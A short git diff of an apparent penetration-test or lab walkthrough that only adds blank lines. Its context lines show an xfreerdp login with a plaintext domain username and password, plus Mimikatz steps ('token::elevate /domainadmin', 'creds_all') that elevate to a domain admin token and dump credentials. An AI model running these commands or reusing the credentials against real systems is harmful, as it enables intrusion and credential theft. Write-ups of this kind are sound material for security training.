@@ -96,6 +96,7 @@ Read it and we get creds:
 Unknown Host 2 is the fax server
 
 - Connect with xfreerdp:
+  
 ```bash
 xfreerdp /v:10.102.17.110 /u:artica\fax_acc /p:'03mglosmf!!' /cert:ignore /dynamic-resolution
 
@@ -163,6 +164,7 @@ kiwi_cmd "token::elevate /domainadmin"
 ```
 
 ![image12](../resources/e823fa026d6c4d6e935a82584e83e2ae.png)
+
 ```bash
 creds_all
 ```
